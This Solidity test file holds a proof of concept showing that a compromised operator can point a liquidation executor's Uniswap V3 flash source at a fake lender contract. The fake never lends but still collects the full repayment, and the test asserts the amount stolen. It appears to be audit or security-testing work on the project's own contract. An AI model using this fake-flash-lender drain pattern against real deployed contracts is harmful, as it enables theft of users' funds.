// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {ExecutorTestBase} from "../unit/Base.sol";
import {PlanBuilder as PB} from "../unit/PlanBuilder.sol";
import {MockERC20} from "../unit/Mocks.sol";
import {Executor} from "../../src/Executor.sol";

interface IUniV3FlashCb {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

/// Plan-controlled flashSource that never lends; still receives the "repay" transfer.
contract FakeUniV3Flash {
    function flash(address recipient, uint256, uint256, bytes calldata data) external {
        IUniV3FlashCb(recipient).uniswapV3FlashCallback(0, 0, data);
    }

    function token0() external pure returns (address) {
        return address(0);
    }
}

/*
 * UniV3 flash path arms T_EXPECTED_CALLER = plan.flashSource without CREATE2.
 * Compromised OPERATOR sets flashSource to FakeUniV3Flash, funds liquidation from
 * standing debt, then Fake receives the repay transfer (flashAmount + fees).
 */
contract FakeFlashSourceDrainPoC is ExecutorTestBase {
    FakeUniV3Flash internal fake;
    address internal attacker;

    function setUp() public override {
        super.setUp();
        fake = new FakeUniV3Flash();
        attacker = address(fake);
    }

    function test_poc_fake_univ3_flashSource_steals_repay() public {
        // Fund liquidation from standing balance (no real flash credit).
        debt.mint(address(ex), REPAY);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_UNIV3, address(fake), address(debt), REPAY, 1, 1),
            PB.legV3(address(pool), borrower, address(coll), REPAY),
            _repayLeg(),
            PB.profit(1, _profitLeg())
        );

        uint256 fakeBefore = debt.balanceOf(address(fake));
        _exec(plan);
        uint256 stolen = debt.balanceOf(address(fake)) - fakeBefore;

        // Fake never lent; still received flashAmount (+ 0 fees).
        assertEq(stolen, REPAY, "fake flashSource received full repay without lending");
        assertGt(weth.balanceOf(address(ex)), 0, "liq profit WETH remains on executor");
    }
}
